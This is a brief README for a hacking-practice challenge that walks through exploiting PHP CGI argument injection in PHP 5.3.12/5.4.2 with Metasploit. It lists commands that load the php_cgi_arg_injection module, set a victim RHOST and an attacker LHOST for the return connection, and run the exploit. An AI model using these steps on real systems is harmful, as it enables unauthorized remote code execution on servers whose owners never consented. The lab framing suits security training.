# HackTheStack

This is simple hack challenge where you use the tool Metasploit to exploit a known vulnerability in a PHP server, with the version 5.3.12 and 5.4.2.
This exploit is also called PHP CGI arg injection, where the exploit takes advantage of -d flag to set the php.ini directives to achieve code execution. In short this leads to access to CGI binaries, and can run your code remotely.

Here's how you'd do it syntactically using metasploit.

1) Open the terminal in an environment that has Metasploit already installed. (E.g Kali Linux) <br />
2) Type "msf" in the command line (without the double quotes) <br />
3) Type use exploit/multi/http/php_cgi_arg_injection <br />
4) Type SET RHOST <VICTIM_IP> where VICTIM_IP is what it sounds like <br />
5) Type SET LHOST <ATTACKER_IP> where ATTACKER_IP is also what it sounds like <br />
6) Type "run" (without the double quotes) <br />
7) Don't be nasty <br />
